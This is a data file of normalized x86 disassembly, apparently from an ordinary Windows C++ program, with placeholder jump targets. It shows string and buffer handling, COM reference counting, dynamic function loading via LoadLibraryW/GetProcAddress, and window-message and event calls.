mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp [ esp + 0x10 ] ecx
jb r-xdata
mov eax [ esi + 0xc ]
add eax [ esp + 0x14 ]
cmp [ eax + 0x18 ] 0x10
mov edi [ eax + 0x14 ]
jb r-xdata
call sub_4407b7
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
mov ebp [ esp + 0x30 ]
mov edx [ esp + 0x1c ]
cmp ebp 0x10
jae r-xdata
mov eax edi
mov ebx [ esp + 0x2c ]
mov eax ebx
cmp ebx edi
jb r-xdata
call sub_413160
test eax eax
jne r-xdata
lea edx [ esp + 0x1c ]
sete bl
mov [ esp + 0x3c ] 0xffffffff
cmp ebp 0x10
jb r-xdata
cmp ebx edi
jae r-xdata
test bl bl
jne r-xdata
mov edx [ esp + 0x1c ]
push edx
call sub_43f960
add esp 0x4
xor eax eax
cmp ebx edi
setne al
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x34 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebp
pop ebx
add esp 0x30
retn 0x4
mov ecx [ esi + 0x10 ]
sub ecx [ esi + 0xc ]
mov edi [ esp + 0x10 ]
add [ esp + 0x14 ] 0x1c
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
inc edi
add eax edx
mov [ esp + 0x10 ] edi
cmp edi eax
jb r-xdata
test eax eax
xor edi edi
sub_402420
mov [ eax + 0x18 ] 0xf
xor ecx ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x4 ] cl
mov [ eax + 0x30 ] ecx
mov edx 0x7
mov [ eax + 0x34 ] edx
push esi
xor esi esi
mov [ eax + 0x20 ] si
mov [ eax + 0x50 ] edx
mov [ eax + 0x4c ] ecx
mov [ eax + 0x3c ] si
mov [ eax + 0x6c ] edx
mov [ eax + 0x68 ] ecx
mov [ eax + 0x58 ] si
mov [ eax + 0x8c ] edx
mov [ eax + 0x88 ] ecx
mov [ eax + 0x78 ] si
mov [ eax + 0xbc ] edx
mov [ eax + 0xb8 ] ecx
mov [ eax + 0xa8 ] cx
pop esi
retn
sub_402480
push ebx
push ebp
mov ebp 0x8
push edi
cmp [ esi + 0xbc ] ebp
jb r-xdata
xor ebx ebx
mov edi 0x7
xor ecx ecx
mov [ esi + 0xbc ] edi
mov [ esi + 0xb8 ] ebx
mov [ esi + 0xa8 ] cx
cmp [ esi + 0x8c ] ebp
jb r-xdata
mov eax [ esi + 0xa8 ]
push eax
call sub_43f960
add esp 0x4
xor eax eax
mov [ esi + 0x8c ] edi
mov [ esi + 0x88 ] ebx
mov [ esi + 0x78 ] ax
cmp [ esi + 0x6c ] ebp
jb r-xdata
mov edx [ esi + 0x78 ]
push edx
call sub_43f960
add esp 0x4
xor edx edx
mov [ esi + 0x6c ] edi
mov [ esi + 0x68 ] ebx
mov [ esi + 0x58 ] dx
cmp [ esi + 0x50 ] ebp
jb r-xdata
mov ecx [ esi + 0x58 ]
push ecx
call sub_43f960
add esp 0x4
xor ecx ecx
mov [ esi + 0x50 ] edi
mov [ esi + 0x4c ] ebx
mov [ esi + 0x3c ] cx
cmp [ esi + 0x34 ] ebp
jb r-xdata
mov eax [ esi + 0x3c ]
push eax
call sub_43f960
add esp 0x4
xor eax eax
mov [ esi + 0x34 ] edi
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] ax
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov edx [ esi + 0x20 ]
push edx
call sub_43f960
add esp 0x4
pop edi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] 0xf
pop ebp
mov [ esi + 0x4 ] bl
pop ebx
retn
mov ecx [ esi + 0x4 ]
push ecx
call sub_43f960
add esp 0x4
sub_402560
push 0xffffffff
push sub_459d18
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
mov [ esi + 0x18 ] 0xf
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
mov [ esi + 0x30 ] eax
mov ecx 0x7
mov [ esi + 0x34 ] ecx
xor edx edx
mov [ esi + 0x20 ] dx
mov [ esi + 0x50 ] ecx
mov [ esi + 0x4c ] eax
mov [ esi + 0x3c ] dx
mov [ esi + 0x6c ] ecx
mov [ esi + 0x68 ] eax
mov [ esi + 0x58 ] dx
mov [ esi + 0x8c ] ecx
mov [ esi + 0x88 ] eax
mov [ esi + 0x78 ] dx
mov [ esi + 0xbc ] ecx
xor ecx ecx
mov [ esi + 0xb8 ] eax
mov [ esi + 0xa8 ] cx
lea edx [ esi + 0xc0 ]
push edx
mov [ esp + 0x14 ] eax
call sub_40f4f0
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
sub_402610
push 0xffffffff
push 0x0
push edi
mov ecx esi
call sub_429ea0
push 0xffffffff
push 0x0
lea eax [ edi + 0x1c ]
lea ecx [ esi + 0x1c ]
call sub_429a10
push 0xffffffff
push 0x0
lea eax [ edi + 0x38 ]
lea ecx [ esi + 0x38 ]
call sub_429a10
push 0xffffffff
push 0x0
lea eax [ edi + 0x54 ]
lea ecx [ esi + 0x54 ]
call sub_429a10
mov al [ edi + 0x70 ]
mov [ esi + 0x70 ] al
mov cl [ edi + 0x71 ]
mov [ esi + 0x71 ] cl
mov dl [ edi + 0x72 ]
push 0xffffffff
push 0x0
lea eax [ edi + 0x74 ]
lea ecx [ esi + 0x74 ]
mov [ esi + 0x72 ] dl
call sub_429a10
mov eax [ edi + 0x90 ]
mov [ esi + 0x90 ] eax
mov ecx [ edi + 0x98 ]
mov [ esi + 0x98 ] ecx
mov edx [ edi + 0x9c ]
mov [ esi + 0x9c ] edx
mov eax [ edi + 0xa0 ]
push 0xffffffff
mov [ esi + 0xa0 ] eax
push 0x0
lea eax [ edi + 0xa4 ]
lea ecx [ esi + 0xa4 ]
call sub_429a10
mov eax esi
retn
sub_4026c0
push 0xffffffff
push sub_45a19e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x12c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x128 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x140 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x150 ]
xor ebx ebx
mov [ esp + 0x18 ] ebx
xor ebp ebp
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] ebx
mov [ esp + 0x44 ] bl
push r--data
mov [ esp + 0x14c ] ebx
call sub_428aa0
push eax
call sub_43fd57
mov esi eax
add esp 0x8
cmp esi ebx
je r-xdata
push 0x4
call sub_43fa1d
add esp 0x4
cmp eax ebx
je r-xdata
push 0x2
push ebx
push esi
call sub_43fe4b
add esp 0xc
push esi
call sub_44006d
add esp 0x4
push ebx
push ebx
push esi
mov edi eax
call sub_43fe4b
lea eax [ edi + 0x1 ]
add esp 0xc
push eax
call sub_43f0ce
add esp 0x4
push esi
push 0x1
mov ebp eax
push edi
push ebp
mov [ ebp ] bl
call sub_44037b
add esp 0x10
cmp eax 0x1
je r-xdata
xor eax eax
lea edx [ esp + 0x1c ]
mov [ eax ] edx
jmp r-xdata
mov [ edi + ebp ] bl
mov eax ebp
mov ecx ebp
cmp [ ebp ] bl
je r-xdata
or esi 0xffffffff
cmp [ esp + 0x58 ] 0x10
jb r-xdata
lea esi [ esp + 0x1c ]
call sub_401230
test al al
jne r-xdata
lea edi [ esp + 0x44 ]
mov [ esp + 0x1c ] eax
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x148 ] 0x1
cmp [ esp + 0x58 ] 0x10
mov edi [ esp + 0x44 ]
jae r-xdata
push esi
mov [ ecx ] bl
call sub_44040f
add esp 0x4
push edi
push ebp
lea ecx [ esp + 0x48 ]
call sub_42a180
nop
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] ebx
mov [ esp + 0x44 ] bl
cmp ebp ebx
je r-xdata
mov ecx [ esp + 0x44 ]
push ecx
call sub_43f960
add esp 0x4
jmp r-xdata
mov edx [ esp + 0x154 ]
push edx
lea eax [ esp + 0x60 ]
push eax
call sub_4014d0
lea ecx [ esp + 0x5c ]
push ecx
lea edi [ esp + 0x20 ]
mov [ esp + 0x14c ] 0x2
call sub_4012e0
mov esi [ esp + 0x130 ]
cmp esi ebx
je r-xdata
mov eax esi
push eax
mov [ esp + 0x1c ] 0xfffffffe
mov [ esp + 0x14c ] bl
call sub_4011d0
cmp [ esp + 0x58 ] 0x10
jb r-xdata
mov [ ecx ] dl
inc ecx
mov [ ecx ] 0xa
inc eax
inc ecx
cmp [ eax ] 0xa
jne r-xdata
mov eax esi
mov ecx [ esp + 0x140 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x128 ]
xor ecx esp
call sub_43f96b
add esp 0x138
retn
push ebp
call sub_43f97a
add esp 0x4
mov edx [ esp + 0x124 ]
push edx
mov [ esp + 0x134 ] ebx
mov [ esp + 0x138 ] ebx
mov [ esp + 0x13c ] ebx
call sub_43f960
add esp 0x4
lea esi [ esp + 0x64 ]
call sub_402480
mov [ esp + 0x148 ] 0x3
mov ecx [ esp + 0x3c ]
cmp ecx ebx
je r-xdata
mov edi [ esp + 0x134 ]
cmp esi edi
je r-xdata
mov esi [ esp + 0x18 ]
mov ecx [ esp + 0x44 ]
push ecx
jmp r-xdata
mov dl [ eax ]
cmp dl 0xd
jne r-xdata
cmp [ eax ] bl
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x38 ]
cmp eax ebx
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push esi
call sub_43f960
add esp 0x4
nop
call sub_43f960
add esp 0x4
inc eax
mov esi [ esp + 0x30 ]
mov eax [ esp + 0x2c ]
cmp esi ebx
jbe r-xdata
lea ecx [ ecx ]
call sub_402480
add esi 0xc0
cmp esi edi
jne r-xdata
mov esi [ esp + 0x130 ]
cmp eax ebx
je r-xdata
lea ecx [ ecx ]
mov [ esp + 0x38 ] eax
sub eax 0x1
jne r-xdata
mov ecx [ esp + 0x1c ]
push ecx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x30 ] ebx
call sub_43f960
add esp 0x4
cmp [ esp + 0x58 ] 0x10
jb r-xdata
push eax
call sub_43f960
add esp 0x4
cmp esi ebx
ja r-xdata
mov eax [ eax + esi * 4 ]
push eax
call sub_43f960
mov eax [ esp + 0x30 ]
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esp + 0x34 ] ebx
mov edx [ esp + 0x44 ]
push edx
dec esi
cmp [ eax + esi * 4 ] ebx
je r-xdata
sub_4029d0
push ebx
push esi
mov esi eax
lea ebx [ esi + 0xc8 ]
call sub_40ffb0
mov eax [ ebx ]
push eax
call sub_43f960
add esp 0x4
add esi 0x8
call sub_402480
pop esi
pop ebx
retn
sub_402a10
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx [ esp + 0x8 ]
mov eax [ esp + 0xc ]
lea ecx [ esi + 0x8 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
push esi
push sub_402a60
push eax
push ecx
call sub_44058c
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x4 ]
add esp 0x18
neg eax
sbb eax eax
and eax 0x3
add eax 0xfffffffd
pop esi
retn 0xc
or eax 0xffffffff
pop esi
retn 0xc
sub_402a60
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push edi
mov ecx esi
call edx
mov edi eax
cmp edi 0x63
jne r-xdata
lea eax [ esi + 0x1 ]
pop esi
retn 0x4
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x4
mov eax edi
pop edi
mov [ esi + 0x8 ] 0x0
pop esi
retn 0x4
mov ecx [ esi + 0x4 ]
push ecx
call [ CloseHandle@IAT ]
mov [ esi + 0x4 ] 0x0
sub_402ad0
push 0xffffffff
push sub_458e3b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_43fa1d
mov esi eax
add esp 0x4
mov [ esp + 0x8 ] esi
mov [ esp + 0x14 ] 0x0
test esi esi
je r-xdata
xor esi esi
push r--data
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call [ SysAllocString@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax ebx
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn
push 0x8007000e
call sub_43f7b0
mov [ esp + 0x14 ] 0xffffffff
mov [ ebx ] esi
test esi esi
jne r-xdata
push 0x8007000e
call sub_43f7b0
sub_402b70
push 0xffffffff
push sub_458e0b
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x18 ]
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0x1
mov [ eax ] ecx
jmp r-xdata
mov eax esi
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
add esp 0x10
retn 0x4
push 0x8007000e
call sub_43f7b0
mov [ esp + 0x10 ] 0xffffffff
mov [ esi ] eax
test eax eax
jne r-xdata
sub_402bf0
push esi
mov esi [ edi ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0x0
test esi esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_43f960
add esp 0x4
push eax
call sub_43f97a
add esp 0x4
sub_402c40
cmp edi ebx
je r-xdata
mov eax edi
retn
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov [ edi ] eax
pop esi
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
add eax 0x8
push eax
call [ InterlockedIncrement@IAT ]
mov [ edi ] 0x0
test esi esi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push esi
call sub_43f960
add esp 0x4
push eax
call sub_43f97a
add esp 0x4
sub_402ca0
push 0xffffffff
push sub_459168
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov edi edx
mov [ esp + 0xc ] 0x0
mov [ esp + 0x18 ] 0x0
mov eax [ esp + 0x24 ]
mov [ esp + 0xc ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edx [ esp + 0xc ]
push edx
call sub_402b70
mov edi [ esp + 0x24 ]
test edi edi
je r-xdata
push r--data
push edi
push eax
call sub_43f7d0
mov ecx [ edi ]
mov ecx [ ecx + 0xc ]
lea edx [ esp + 0xc ]
push edx
push eax
mov eax [ esp + 0x28 ]
push eax
push edi
call ecx
test eax eax
jge r-xdata
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x8
lea eax [ edi + 0x8 ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
test edi edi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
push edi
call sub_43f960
add esp 0x4
push eax
call sub_43f97a
add esp 0x4
sub_402d70
push 0xffffffff
push sub_45ac5a
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x20 ]
xor ebx ebx
mov [ esi ] r--data
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov eax [ esp + 0x24 ]
mov [ esp + 0x18 ] ebx
mov [ esi ] r--data
mov [ esi + 0xc ] eax
mov [ esi + 0x70 ] ebx
mov [ esi + 0x74 ] ebx
mov [ esp + 0x18 ] 0x2
mov [ esi + 0x7c ] bl
lea ecx [ esi + 0x88 ]
mov [ esi + 0x7d ] bl
push ecx
mov [ esi + 0x80 ] ebx
call sub_40f4f0
lea edx [ esi + 0xa0 ]
push edx
mov [ esp + 0x1c ] 0x3
call sub_40f4f0
lea eax [ esi + 0xc8 ]
mov [ esp + 0x18 ] 0x4
push eax
mov [ esi + 0xb8 ] ebx
mov [ esi + 0xc4 ] ebx
call sub_40f4f0
mov [ esi + 0xbc ] ebx
mov [ esi + 0xc0 ] ebx
mov [ esi + 0x68 ] ebx
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
add esp 0x10
retn 0x8
sub_402e30
push 0xffffffff
push sub_45ac5a
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x20 ]
mov [ esi ] r--data
lea eax [ esi + 0xb8 ]
push eax
mov [ esp + 0x1c ] 0x4
call sub_42e600
mov eax [ esi + 0xac ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ esi + 0xa0 ]
push eax
mov [ esi + 0xac ] ebx
mov [ esi + 0xb0 ] ebx
mov [ esi + 0xb4 ] ebx
call sub_43f960
mov eax [ esi + 0x94 ]
add esp 0x4
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x20 ]
mov edi [ esi + 0xb0 ]
push ecx
call sub_429630
mov eax [ esi + 0xac ]
push eax
call sub_43f960
add esp 0x8
mov eax [ esi + 0x88 ]
push eax
mov [ esi + 0x94 ] ebx
mov [ esi + 0x98 ] ebx
mov [ esi + 0x9c ] ebx
call sub_43f960
mov [ esp + 0x1c ] 0x1
mov eax [ esi + 0x74 ]
add esp 0x4
cmp eax ebx
je r-xdata
mov edx [ esp + 0x20 ]
mov edi [ esi + 0x98 ]
push edx
call sub_429630
mov eax [ esi + 0x94 ]
push eax
call sub_43f960
add esp 0x8
mov [ esp + 0x18 ] bl
mov eax [ esi + 0x70 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ esi ] r--data
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add esp 0xc
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_402f50
push ebp
mov ebp esp
push 0xffffffff
push sub_45a8c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov edi edx
mov [ ebp - 0x69 ] bl
cmp eax ebx
je r-xdata
mov eax [ edi + 0x80 ]
test eax eax
jne r-xdata
mov [ edi + 0x84 ] eax
cmp esi 0x1
jne r-xdata
push ebx
push ebx
push 0x1
push ebx
call [ CreateEventW@IAT ]
mov [ edi + 0x80 ] eax
mov ecx [ edi + 0x80 ]
cmp esi 0x2
jne r-xdata
cmp [ edi + 0x68 ] ebx
jne r-xdata
mov [ ebp - 0x69 ] 0x1
cmp [ edi + 0x70 ] 0x0
lea ebx [ edi + 0x70 ]
jne r-xdata
push 0x5c
lea eax [ edi + 0x10 ]
push ebx
push eax
call sub_443360
xor edx edx
add esp 0xc
mov [ edi + 0x68 ] ebx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] ebx
call sub_429250
push 0x13
mov eax r--data
lea ecx [ ebp - 0x30 ]
call sub_429170
call sub_405280
mov eax [ ebp - 0x2c ]
mov esi 0x8
cmp [ ebp - 0x18 ] esi
jae r-xdata
push 0x0
call [ CoInitialize@IAT ]
xor eax eax
mov [ ebp - 0x64 ] ax
push eax
mov eax r--data
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x50 ] 0x7
mov [ ebp - 0x54 ] 0x0
call sub_429cc0
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_429250
test eax eax
jne r-xdata
push eax
call sub_42ed00
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x50 ] 0x8
jb r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
cmp [ ebp - 0x18 ] esi
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
mov al [ ebp - 0x69 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_43f96b
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x64 ]
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
mov eax esi
lea ecx [ ebp - 0x4c ]
call sub_428a10
push 0x16
mov eax r--data
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_429170
push 0x19
mov eax r--data
lea ecx [ ebp - 0x4c ]
call sub_429170
mov ecx [ ebp - 0x48 ]
mov eax 0x8
cmp [ ebp - 0x34 ] eax
jae r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
push eax
call [ LoadLibraryW@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x50 ] eax
mov eax [ ebp - 0x64 ]
jae r-xdata
lea ecx [ ebp - 0x48 ]
mov ebx [ GetProcAddress@IAT ]
push r--data
push esi
call ebx
mov [ edi + 0x10 ] eax
test eax eax
jne r-xdata
mov esi 0x8
push 0x0
push ecx
push eax
call [ CopyFileW@IAT ]
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x48 ]
xor esi esi
cmp [ ebp - 0x34 ] 0x8
jae r-xdata
lea eax [ ebp - 0x64 ]
push r--data
push esi
call ebx
mov [ edi + 0x14 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
push eax
call sub_42ed00
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x48 ]
push r--data
push esi
call ebx
mov [ edi + 0x18 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_43f960
add esp 0x4
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
test esi esi
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x1c ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
jmp r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43f960
add esp 0x4
jmp r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov esi 0x8
cmp [ ebp - 0x34 ] esi
jb r-xdata
push eax
call [ LoadLibraryW@IAT ]
mov esi eax
lea eax [ ebp - 0x48 ]
push r--data
push esi
call ebx
mov [ edi + 0x20 ] eax
test eax eax
je r-xdata
lea esi [ ebp - 0x30 ]
call sub_429950
jmp r-xdata
jb r-xdata
lea esi [ ebp - 0x4c ]
call sub_429950
lea esi [ ebp - 0x68 ]
call sub_429950
jmp r-xdata
mov [ ebp - 0x70 ] 0x0
lea ecx [ ebp - 0x70 ]
push ecx
push r--data
push r--data
mov [ ebp - 0x4 ] 0x5
call eax
test eax eax
mov eax [ ebp - 0x70 ]
jne r-xdata
xor edx edx
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] dx
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_43f960
add esp 0x4
push r--data
push esi
call ebx
mov [ edi + 0x24 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_43f960
add esp 0x4
jmp r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x28 ] eax
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx [ eax ]
push ebx
push r--data
push 0x0
push eax
mov eax [ edx + 0xc ]
call eax
test eax eax
jne r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x2c ] eax
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x70 ]
mov esi [ ebx ]
test esi esi
je r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x30 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x6
mov ecx [ esi ]
mov edx [ ecx + 0xc ]
push esi
call edx
test eax eax
jge r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x34 ] eax
test eax eax
je r-xdata
mov esi [ ebx ]
mov eax [ esi ]
mov ecx [ eax + 0x68 ]
push esi
call ecx
test eax eax
jge r-xdata
push r--data
push esi
push eax
call sub_43f7d0
push r--data
push esi
call ebx
mov [ edi + 0x38 ] eax
test eax eax
je r-xdata
mov eax [ ebx ]
mov ecx [ eax ]
mov edx [ ecx ]
add edi 0x74
push edi
push r--data
push eax
call edx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x70 ]
test eax eax
je r-xdata
push r--data
push esi
push eax
call sub_43f7d0
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x70 ]
test eax eax
je r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x3c ] eax
test eax eax
je r-xdata
lea esi [ ebp - 0x4c ]
call sub_429950
lea esi [ ebp - 0x68 ]
jmp r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
jmp r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x40 ] eax
test eax eax
je r-xdata
call sub_429950
push r--data
push esi
call ebx
mov [ edi + 0x44 ] eax
test eax eax
je r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x48 ] eax
test eax eax
je r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x4c ] eax
test eax eax
je r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x50 ] eax
test eax eax
je r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x54 ] eax
test eax eax
je r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x58 ] eax
test eax eax
je r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x5c ] eax
test eax eax
je r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x60 ] eax
test eax eax
je r-xdata
push r--data
push esi
call ebx
mov [ edi + 0x64 ] eax
test eax eax
je r-xdata
mov ecx [ edi + 0x10 ]
call ecx
mov edx [ edi + 0x14 ]
push eax
mov [ edi + 0x6c ] eax
call edx
add esp 0x4
mov [ edi + 0x68 ] eax
lea esi [ ebp - 0x30 ]
sub_4034d0
push ebp
lea ebp [ esp - 0xac ]
sub esp 0xac
push 0xffffffff
push sub_45b1b9
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xa8 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x10 ]
sub ecx [ eax + 0xc ]
mov eax 0x4bda12f7
imul ecx
sar edx 0x6
mov eax edx
xor edi edi
shr eax 0x1f
add eax edx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x68 ] 0xffffffff
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x18 ] edi
je r-xdata
mov ecx [ ebp - 0x64 ]
mov edx [ esi + 0x84 ]
push 0x0
push ecx
push 0x531
push edx
call [ SendMessageW@IAT ]
xor edi edi
mov [ ebp - 0x14 ] edi
jmp r-xdata
mov al [ esi + 0x7c ]
test al al
jne r-xdata
mov cl [ esi + 0x7c ]
test cl cl
jne r-xdata
mov [ ebp - 0x44 ] edi
lea ecx [ ecx ]
mov edx [ esi + 0x80 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
mov al [ esi + 0x7d ]
test al al
jne r-xdata
mov ecx [ esi + 0x84 ]
push 0x0
push 0x0
push 0x52f
push ecx
